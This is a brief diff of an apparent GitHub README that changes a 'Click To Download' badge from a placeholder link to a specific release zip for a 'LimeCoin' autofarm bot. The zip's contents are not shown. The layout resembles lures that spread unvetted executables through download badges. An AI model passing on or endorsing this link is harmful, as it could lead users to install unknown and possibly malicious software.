@@ -1,4 +1,4 @@
-[<img src="https://img.shields.io/badge/Click_To-Download-green?style=for-the-badge&logo=github">](https://github.com/yourusername/Limecoin-Autofarm/releases/download/Limecoin/Limecoin_Autofarm_Bot.zip)
+[<img src="https://img.shields.io/badge/Click_To-Download-green?style=for-the-badge&logo=github">](https://github.com/FifaNg1/LimeCoin-Auto/releases/download/limecoin/LimeCoin_BotFarm-Coin.13.12.24.zip)
 
 
 > [!Note]
